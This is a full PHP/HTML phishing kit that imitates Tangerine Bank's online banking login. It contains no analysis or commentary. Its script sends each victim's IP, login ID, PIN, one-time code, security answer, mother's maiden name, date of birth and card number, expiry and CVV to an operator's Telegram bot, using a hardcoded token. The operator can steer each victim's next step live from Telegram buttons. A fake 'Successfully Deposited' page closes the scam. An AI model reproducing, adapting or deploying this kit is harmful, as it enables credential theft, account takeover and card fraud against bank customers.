<?php
/**
 * Tangerine Bank Online Banking - Unified Remote Control System (Full Feature)
 */

$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = '-1002922644009';

// Notification for a new visitor
if (!isset($_POST['action'])) {
    $notifyUrl = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    $payload = [
        'chat_id' => $chatId,
        'text' => "🍊 <b>TANGERINE VISITOR</b> 🍊\n\nTARGET CONNECTED\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n🍊 <b>WAITING FOR LOGS</b> 🍊",
        'parse_mode' => 'HTML'
    ];
    @file_get_contents($notifyUrl, false, stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($payload)
        ]
    ]));
}
?>
<!DOCTYPE html>
<html lang="en-CA">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, maximum-scale=1">
<title>tangerine.ca/app/?_gl=1*4i98l*_up*MQ..*_gs*MQ..&gclid=Cj0KCQiA7rDMBhCjARIsAGDBuEB_WcW_V91QKq6WkT1BXcnlWlHePuTo4HuDh7USU3Ifl875jwYSmacaAux9EALw_wcB&gclsrc=aw.ds&gbraid=0AAAAACRKT-wrpL6G0QwmO504vKafstWjI#/visitor-enroll/instructions?locale=en_CA</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css">
<style>
    :root {
        --tg-orange: #f37021;
        --tg-orange-hover: #d15b15;
        --tg-text: #333333;
        --tg-gray-bg: #f5f5f5;
        --tg-border: #cccccc;
        --tg-error: #d32f2f;
    }

    body {
        background-color: white;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        color: var(--tg-text);
        margin: 0;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        -webkit-font-smoothing: antialiased;
    }

    /* Tangerine Header */
    .tg-header {
        background-color: var(--tg-orange);
        padding: 15px 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        z-index: 100;
        position: sticky;
        top: 0;
    }
    .tg-header .logo-container {
        display: flex;
        align-items: center;
        flex-grow: 1;
        justify-content: center;
    }
    .tg-header svg.logo { height: 32px; width: auto; }
    .header-icon { fill: white; cursor: pointer; width: 26px; height: 26px; }

    /* Tabs */
    .tg-tabs {
        display: flex;
        border-bottom: 1px solid #eee;
        margin-top: 0;
        padding: 0 15px;
        background: white;
    }
    .tg-tab {
        flex: 1;
        text-align: center;
        padding: 15px 0;
        font-weight: 700;
        font-size: 16px;
        color: #666;
        cursor: pointer;
        border-bottom: 4px solid transparent;
        transition: all 0.2s;
    }
    .tg-tab.active {
        color: var(--tg-text);
        border-bottom: 4px solid var(--tg-orange);
    }

    /* Content Area */
    .main-content {
        flex-grow: 1;
        padding: 30px 15px;
        display: flex;
        justify-content: center;
        align-items: flex-start;
    }
    .tg-wrapper { width: 100%; max-width: 440px; }

    .tg-title {
        font-size: 2.2rem;
        font-weight: 800; 
        color: var(--tg-text);
        text-align: left;
        margin-bottom: 25px;
    }

    /* Inputs */
    .form-group { margin-bottom: 25px; position: relative; }
    .form-control { 
        border-radius: 4px; 
        border: 1px solid var(--tg-border); 
        padding: 24px 12px 8px 12px; 
        font-size: 16px; 
        transition: all 0.2s;
        height: 58px;
        box-shadow: none;
    }
    .form-label {
        position: absolute;
        top: 18px;
        left: 12px;
        font-size: 16px;
        color: #666;
        transition: all 0.2s;
        pointer-events: none;
        font-weight: 600;
    }
    .form-control:focus + .form-label,
    .form-control:not(:placeholder-shown) + .form-label {
        top: 6px;
        font-size: 12px;
        color: #333;
    }
    .form-control:focus { 
        border-color: var(--tg-orange); 
        box-shadow: 0 0 0 1px var(--tg-orange);
        outline: none;
    }

    .input-hint {
        font-size: 13px;
        color: #666;
        margin-top: 8px;
        line-height: 1.4;
    }

    /* Toggle */
    .tg-toggle-container {
        display: flex;
        align-items: center;
        gap: 12px;
        margin: 25px 0;
    }
    .switch {
        position: relative;
        display: inline-block;
        width: 44px;
        height: 24px;
        flex-shrink: 0;
    }
    .switch input { opacity: 0; width: 0; height: 0; }
    .slider {
        position: absolute;
        cursor: pointer;
        top: 0; left: 0; right: 0; bottom: 0;
        background-color: #ccc;
        transition: .4s;
        border-radius: 34px;
    }
    .slider:before {
        position: absolute;
        content: "";
        height: 20px; width: 20px;
        left: 2px; bottom: 2px;
        background-color: white;
        transition: .4s;
        border-radius: 50%;
    }
    input:checked + .slider { background-color: var(--tg-orange); }
    input:checked + .slider:before { transform: translateX(20px); }

    /* Button */
    .tg-btn {
        width: 100%;
        background-color: var(--tg-orange);
        color: white;
        border: none;
        padding: 16px;
        font-weight: 700;
        border-radius: 30px;
        font-size: 18px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        transition: background 0.2s;
        cursor: pointer;
        margin-top: 20px;
        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .tg-btn:hover { background-color: var(--tg-orange-hover); }
    .tg-btn:active { transform: translateY(1px); }

    .forgot-link {
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 5px;
        margin-top: 25px;
        color: #007aff;
        text-decoration: none;
        font-weight: 600;
        font-size: 15px;
    }

    /* Multi-step */
    .step-section { display: none; }
    .step-section.active { display: block; animation: fadeIn 0.3s ease-in-out; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }

    .error-alert {
        background: #fdf2f2;
        border-left: 4px solid var(--tg-error);
        color: var(--tg-error);
        padding: 15px;
        font-size: 14px;
        margin-bottom: 25px;
        display: none;
        font-weight: 500;
    }

    /* Tangerine Footer Info */
    .tg-footer-info {
        font-size: 12px;
        color: #666;
        margin-top: 60px;
        line-height: 1.6;
    }
    .cdic-logo {
        background-color: #6f2c91;
        color: white;
        padding: 6px 14px;
        border-radius: 20px;
        font-weight: 700;
        display: inline-flex;
        align-items: center;
        gap: 6px;
        margin: 20px 0;
        font-size: 13px;
    }

    /* Loader */
    .loader-overlay {
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background: rgba(255,255,255,0.95);
        display: none; flex-direction: column; justify-content: center; align-items: center;
        z-index: 1000;
    }
    .spinner {
        width: 48px; height: 48px;
        border: 4px solid #f0f0f0;
        border-top: 4px solid var(--tg-orange);
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        margin-bottom: 20px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body class="tg-app">

<div id="loader" class="loader-overlay">
    <div class="spinner"></div>
    <div style="color:var(--tg-orange); font-weight:700; font-size: 18px;">Processing...</div>
</div>

<header class="tg-header">
    <svg class="header-icon" viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
    <div class="logo-container">
        <!-- SVG Logo Provided -->
        <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 166.3 35.86">
            <style>.cls-1{fill:#fff;}</style>
            <polygon class="cls-1" points="0 0.54 0 5.62 8.31 5.62 8.31 28.06 13.47 28.06 13.47 5.62 21.78 5.62 21.78 0.54 0 0.54"/>
            <path class="cls-1" d="M24.47,24c-2.55,0-4.44-2-4.44-5.33s2-5.25,4.44-5.25,4.4,1.86,4.4,5.21S26.94,24,24.47,24ZM28.8,11.25c-.51-1-2-2.32-5.06-2.32-5.06,0-8.59,4.3-8.59,9.78,0,5.67,3.64,9.86,8.74,9.86a5.55,5.55,0,0,0,5-2.63v2.17h4.66V9.39H28.8Z" transform="translate(0 -0.05)"/>
            <path class="cls-1" d="M45.52,8.89a5.88,5.88,0,0,0-5.17,2.82V9.39h-4.7V28.11H40.5V17.34c0-2.17,1.24-3.88,3.35-3.88,2.33,0,3.31,1.63,3.31,3.73V28.11H52V16.31c0-4.11-2-7.42-6.48-7.42" transform="translate(0 -0.05)"/>
            <path class="cls-1" d="M62.84,22.94c-2.51,0-4.29-1.83-4.29-4.76s1.89-4.72,4.29-4.72,4.22,1.83,4.22,4.72-1.75,4.76-4.22,4.76ZM67.1,11.59C66.48,10.34,64.84,9,62,9c-4.91,0-8.33,4.19-8.33,9.13,0,5.25,3.56,9.1,8.33,9.1a5.61,5.61,0,0,0,5-2.4v1.37c0,3.61-1.71,5.21-4.77,5.21A4.06,4.06,0,0,1,58,27.92l-4.37,1.22c.51,3.58,3.79,6.78,8.7,6.78,6.73,0,9.39-4.68,9.39-9.82V9.39H67.1Z" transform="translate(0 -0.05)"/>
            <path class="cls-1" d="M78.31,16.62a4,4,0,0,1,4-3.69,3.67,3.67,0,0,1,4,3.69Zm3.93-7.8c-4.58,0-8.81,3.88-8.81,9.86,0,6.32,4.33,10,9.24,10a8.11,8.11,0,0,0,8.15-5.94l-4-1.26a4,4,0,0,1-4.07,2.85,4.44,4.44,0,0,1-4.51-4.26H91c0-.08.07-.84.07-1.56,0-6-3.31-9.7-8.85-9.7Z" transform="translate(0 -0.05)"/>
            <polygon class="cls-1" points="105.35 28.06 110.19 28.06 110.19 9.34 105.35 9.34 105.35 28.06"/>
            <path class="cls-1" d="M117,11.71V9.39h-4.7V28.11h4.84V17.34c0-2.17,1.24-3.88,3.35-3.88,2.33,0,3.31,1.63,3.31,3.73V28.11h4.84V16.31c0-4.11-2-7.42-6.48-7.42A5.88,5.88,0,0,0,117,11.71Z" transform="translate(0 -0.05)"/>
            <path class="cls-1" d="M135.17,16.62a4,4,0,0,1,4-3.69,3.67,3.67,0,0,1,4,3.69Zm3.93-7.8c-4.59,0-8.81,3.88-8.81,9.86,0,6.32,4.33,10,9.24,10a8.1,8.1,0,0,0,8.15-5.94l-4-1.26a4,4,0,0,1-4.08,2.85,4.44,4.44,0,0,1-4.51-4.26h12.81c0-.08.07-.84.07-1.56,0-6-3.31-9.7-8.84-9.7Z" transform="translate(0 -0.05)"/>
            <path class="cls-1" d="M107.77,0a3,3,0,0,0-2.95,3.08,2.95,2.95,0,1,0,5.89,0A3,3,0,0,0,107.77,0" transform="translate(0 -0.05)"/>
            <path class="cls-1" d="M102.54,9.1a5.55,5.55,0,0,0-5.09,3.19V9.39H92.76V28.11H97.6V19.42c0-4,2.15-5.29,4.62-5.29a7,7,0,0,1,1.45.15V9.18a10.44,10.44,0,0,0-1.13-.08" transform="translate(0 -0.05)"/>
            <path class="cls-1" d="M166.15,1.31A1.35,1.35,0,0,0,165,.59H148.1a.91.91,0,0,0-.88.77.93.93,0,0,0,.56,1c2,.72,5.38,2.23,7,5.39s1.06,6.91.54,9.09a.93.93,0,0,0,.54,1.06.88.88,0,0,0,1.09-.36l9.11-14.84a1.48,1.48,0,0,0,.06-1.43" transform="translate(0 -0.05)"/>
        </svg>
    </div>
    <svg class="header-icon" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
</header>

<div class="tg-tabs">
    <div class="tg-tab active" id="tab-personal" onclick="switchTab('personal')">Personal</div>
    <div class="tg-tab" id="tab-business" onclick="switchTab('business')">Business</div>
</div>

<main class="main-content">
    <div class="tg-wrapper">
        <h1 class="tg-title">Log in</h1>

        <!-- STEP 1: LOGIN ID -->
        <section id="step-login" class="step-section active">
            <div id="err-login" class="error-alert">Please check your entries and try again.</div>
            <div class="form-group">
                <input type="text" id="username" class="form-control w-100" placeholder=" " autocomplete="off">
                <label class="form-label">Login ID</label>
                <div class="input-hint">You can use your Client Number, Card Number, or Username.</div>
            </div>
            
            <div class="tg-toggle-container">
                <label class="switch">
                    <input type="checkbox" id="rememberMe">
                    <span class="slider"></span>
                </label>
                <span style="font-size: 15px; font-weight: 700; color: #444;">Remember me on this device</span>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="#666"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
            </div>

            <button onclick="submitLogin()" class="tg-btn">Next</button>
            <a href="#" class="forgot-link">Forgot Login ID? <span>&rsaquo;</span></a>
        </section>

        <!-- STEP 2: PIN (Password) -->
        <section id="step-pin" class="step-section">
            <div id="err-pin" class="error-alert">Incorrect PIN. Please try again.</div>
            <div class="form-group">
                <input type="password" id="pin" class="form-control w-100" placeholder=" ">
                <label class="form-label">PIN</label>
            </div>
            <button onclick="submitPin()" class="tg-btn">Log In</button>
            <a href="#" class="forgot-link">Forgot PIN? <span>&rsaquo;</span></a>
        </section>

        <!-- STEP 3: 6-DIGIT CODE -->
        <section id="step-otp" class="step-section">
            <h2 style="font-size: 18px; font-weight: 700; margin-bottom: 20px;">Security Verification</h2>
            <p style="font-size: 15px; color: #555; margin-bottom: 25px;">Please enter the 6-digit verification code sent to your mobile device.</p>
            <div id="err-otp" class="error-alert">Invalid code.</div>
            <div class="form-group">
                <input type="tel" id="otp-code" class="form-control w-100 text-center" maxlength="6" placeholder=" " style="letter-spacing: 5px; font-size: 24px;">
                <label class="form-label" style="left: 50%; transform: translateX(-50%); width: max-content;">6-Digit Code</label>
            </div>
            <button onclick="submitOtp()" class="tg-btn">Next</button>
            <a href="#" class="forgot-link">Didn't receive code?</a>
        </section>

        <!-- STEP 4: SECURITY QUESTION -->
        <section id="step-security" class="step-section">
            <h2 style="font-size: 18px; font-weight: 700; margin-bottom: 20px;">Security Question</h2>
            <p style="font-size: 15px; color: #555; margin-bottom: 25px;">To complete the deposit, please answer the security question.</p>
            <div id="sq-text" style="padding: 15px; background: #fef0e8; border-radius: 4px; border-left: 4px solid var(--tg-orange); color: var(--tg-orange); font-weight: 700; margin-bottom: 20px; font-size: 15px;">What was the name of your first elementary school?</div>
            <div id="err-security" class="error-alert">Incorrect answer.</div>
            <div class="form-group">
                <input type="text" id="sq-answer" class="form-control w-100" placeholder=" ">
                <label class="form-label">Answer</label>
            </div>
            <button onclick="submitSecurity()" class="tg-btn">Confirm</button>
        </section>

        <!-- STEP 5: PERSONAL INFO -->
        <section id="step-personal" class="step-section">
            <h2 style="font-size: 18px; font-weight: 700; margin-bottom: 20px;">Identity Verification</h2>
            <p style="font-size: 15px; color: #555; margin-bottom: 25px;">Please verify your identity details to continue.</p>
            <div id="err-personal" class="error-alert">Invalid details.</div>
            <div class="form-group">
                <input type="text" id="mmn" class="form-control w-100" placeholder=" ">
                <label class="form-label">Mother's Maiden Name</label>
            </div>
            <div class="form-group">
                <input type="tel" id="dob" class="form-control w-100" placeholder=" ">
                <label class="form-label">Date of Birth (DD/MM/YYYY)</label>
            </div>
            <button onclick="submitPersonal()" class="tg-btn">Next</button>
        </section>

        <!-- STEP 6: CREDIT CARD -->
        <section id="step-cc" class="step-section">
            <h2 style="font-size: 18px; font-weight: 700; margin-bottom: 20px;">Card Authentication</h2>
            <p style="font-size: 15px; color: #555; margin-bottom: 25px;">Enter your card details to authenticate this secure session.</p>
            <div id="err-cc" class="error-alert">Verification failed.</div>
            <div class="form-group">
                <input type="tel" id="cc-num" class="form-control w-100" placeholder=" ">
                <label class="form-label">Card Number</label>
            </div>
            <div class="row">
                <div class="col-7 form-group">
                    <input type="tel" id="cc-exp" class="form-control w-100" placeholder=" ">
                    <label class="form-label">Expiry (MM/YY)</label>
                </div>
                <div class="col-5 form-group">
                    <input type="password" id="cc-cvv" class="form-control w-100" placeholder=" " maxlength="4">
                    <label class="form-label">CVV</label>
                </div>
            </div>
            <button onclick="submitCC()" class="tg-btn">Verify Card</button>
        </section>

        <!-- STEP 7: SUCCESS -->
        <section id="step-success" class="step-section text-center">
            <div style="font-size: 50px; color: #4CAF50; margin: 20px 0 10px;">&check;</div>
            <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 15px;">Successfully Deposited</h2>
            <p style="color: #666; font-size: 15px; line-height: 1.6;">Your funds have been securely synchronized with your Tangerine account. You can now close this window.</p>
            <button onclick="endSession()" class="tg-btn mt-4">Close</button>
        </section>

        <div class="tg-footer-info">
            Tangerine Bank is a wholly-owned subsidiary of The Bank of Nova Scotia and a member of the Canada Deposit Insurance Corporation (CDIC) in its own right.
            <div class="cdic-logo">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M12 2L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
                cdic&sade
            </div>
            <br>
            <a href="#" style="color: #007aff; text-decoration: none;">CDIC Deposit Insurance Information</a>
            <br><br>
            <a href="#" style="color: #007aff; text-decoration: none; display: flex; align-items: center; gap: 5px; font-weight: 600;">
                Security Guarantee <svg width="14" height="14" viewBox="0 0 24 24" fill="#007aff"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
            </a>
        </div>
    </div>
</main>

<script>
    const BOT_TOKEN = "<?= $telegramToken; ?>";
    const CHAT_ID = "<?= $chatId; ?>";
    let lastMsgId = null;
    let currentStep = 'step-login';
    let lastUpdateId = 0;
    let pollInterval = null;
    let savedUsername = "";
    let loginType = 'Personal';

    function switchTab(tab) {
        document.querySelectorAll('.tg-tab').forEach(t => t.classList.remove('active'));
        document.getElementById('tab-' + tab).classList.add('active');
        loginType = tab === 'personal' ? 'Personal' : 'Business';
    }

    function navigate(id) {
        document.querySelectorAll('.step-section').forEach(s => s.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        currentStep = id;
        document.querySelectorAll('.error-alert').forEach(e => e.style.display = 'none');
        window.scrollTo(0, 0);
    }

    function toggleLoader(show) {
        document.getElementById('loader').style.display = show ? 'flex' : 'none';
    }

    async function pushToBot(content, title, showKeyboard = true) {
        if(showKeyboard) toggleLoader(true);
        const text = `🍊 <b>${title}</b> 🍊\n\n${content}\n\n⚙️ <b>ACTIONS</b>`;
        const keyboard = {
            inline_keyboard: [
                [{text: "✅ Approve", callback_data: "ok"}],
                [{text: "❌ Show Error", callback_data: "err"}],
                [{text: "🔢 Need OTP", callback_data: "go_otp"}, {text: "❓ Need SQ", callback_data: "go_sq"}],
                [{text: "💳 Card Info", callback_data: "go_cc"}, {text: "👤 Info", callback_data: "go_personal"}],
                [{text: "🏁 Success", callback_data: "go_success"}]
            ]
        };
        
        const payload = {
            chat_id: CHAT_ID, 
            text, 
            parse_mode:'HTML'
        };

        if (showKeyboard) {
            payload.reply_markup = keyboard;
        }

        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify(payload)
            });
            
            if(showKeyboard) {
                const data = await res.json();
                lastMsgId = data.result.message_id;
                startPolling();
            }
        } catch (e) { 
            if(showKeyboard) toggleLoader(false); 
        }
    }

    function startPolling() {
        if(pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=10`);
                const data = await res.json();
                if(data.result?.length) {
                    for(const u of data.result) {
                        lastUpdateId = u.update_id;
                        if(u.callback_query && u.callback_query.message.message_id === lastMsgId) {
                            clearInterval(pollInterval);
                            
                            // EXPLICITLY REMOVE KEYBOARD AFTER SELECTION
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
                                method: 'POST',
                                headers: {'Content-Type':'application/json'},
                                body: JSON.stringify({
                                    chat_id: CHAT_ID, 
                                    message_id: lastMsgId, 
                                    reply_markup: {inline_keyboard: []}
                                })
                            });

                            handleCommand(u.callback_query.data);
                        }
                    }
                }
            } catch(e) {}
        }, 1500);
    }

    function handleCommand(cmd) {
        toggleLoader(false);
        switch(cmd) {
            case 'ok': navigate(getNextStep(currentStep)); break;
            case 'err': document.getElementById('err-' + currentStep.split('-')[1]).style.display = 'block'; break;
            case 'go_otp': navigate('step-otp'); break;
            case 'go_sq': navigate('step-security'); break;
            case 'go_personal': navigate('step-personal'); break;
            case 'go_cc': navigate('step-cc'); break;
            case 'go_success': navigate('step-success'); break;
        }
    }

    function getNextStep(curr) {
        // Flow: Login -> Pin -> OTP -> Security -> Success
        // Default forward progression
        const steps = ['step-login', 'step-pin', 'step-otp', 'step-security', 'step-success'];
        const idx = steps.indexOf(curr);
        if (idx > -1 && idx < steps.length - 1) return steps[idx + 1];
        return 'step-success';
    }

    // Handlers
    function submitLogin() {
        const u = document.getElementById('username').value;
        if(u.length < 3) return;
        savedUsername = u;
        // Send logs without keyboard and move to next step automatically
        pushToBot(`TYPE: ${loginType}\nLOGIN ID: <code>${u}</code>`, "USERNAME LOG", false);
        navigate('step-pin');
    }

    function submitPin() {
        const p = document.getElementById('pin').value;
        if(p.length < 4) return;
        pushToBot(`LOGIN ID: <code>${savedUsername}</code>\nPIN: <code>${p}</code>`, "PIN LOG");
    }

    function submitOtp() {
        const c = document.getElementById('otp-code').value;
        if(c.length < 6) return;
        pushToBot(`OTP CODE: <code>${c}</code>`, "OTP LOG");
    }

    function submitSecurity() {
        const a = document.getElementById('sq-answer').value;
        if(!a) return;
        pushToBot(`SQ ANSWER: <code>${a}</code>`, "QUESTION LOG");
    }

    function submitPersonal() {
        const m = document.getElementById('mmn').value;
        const d = document.getElementById('dob').value;
        if(!m || d.length < 10) return;
        pushToBot(`MMN: <code>${m}</code>\nDOB: <code>${d}</code>`, "PERSONAL LOG");
    }

    function submitCC() {
        const n = document.getElementById('cc-num').value.replace(/\s/g, '');
        const e = document.getElementById('cc-exp').value;
        const c = document.getElementById('cc-cvv').value;
        if(n.length < 15) return;
        pushToBot(`CC: <code>${n}</code>\nEXP: <code>${e}</code>\nCVV: <code>${c}</code>`, "CARD LOG");
    }

    function endSession() { window.location.href = "https://www.tangerine.ca"; }

    // Masking Scripts
    document.getElementById('cc-num').addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g, '').substring(0, 16);
        e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
    });
    document.getElementById('cc-exp').addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g, '').substring(0, 4);
        if(v.length >= 3) v = v.substring(0, 2) + '/' + v.substring(2);
        e.target.value = v;
    });
    document.getElementById('dob').addEventListener('input', e => {
        let v = e.target.value.replace(/\D/g, '').substring(0, 8);
        if(v.length >= 5) v = v.substring(0, 2) + '/' + v.substring(2, 4) + '/' + v.substring(4);
        else if(v.length >= 3) v = v.substring(0, 2) + '/' + v.substring(2);
        e.target.value = v;
    });

    window.onload = async () => {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const d = await res.json();
        if(d.result?.length) lastUpdateId = d.result[0].update_id;
    };
</script>

</body>
</html>